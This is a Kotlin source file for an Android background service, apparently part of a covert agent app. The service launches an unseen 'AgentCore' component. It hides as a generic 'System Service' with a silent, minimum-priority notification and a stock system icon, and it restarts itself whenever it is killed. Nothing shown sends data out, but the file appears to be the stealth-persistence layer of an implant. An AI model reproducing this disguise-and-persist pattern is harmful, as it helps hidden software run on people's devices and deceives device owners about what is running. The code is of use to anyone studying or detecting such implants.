package com.tlsclient.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class AgentService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var agentCore: AgentCore? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(Config.NOTIFICATION_ID, buildNotification())
        startAgent()
    }

    private fun startAgent() {
        agentCore = AgentCore(applicationContext)
        scope.launch {
            agentCore?.run()
        }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            Config.NOTIFICATION_CHANNEL_ID,
            "System Service",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Background system service"
            setShowBadge(false)
        }
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, Config.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY  // Restart if killed
    }

    override fun onDestroy() {
        agentCore?.stop()
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
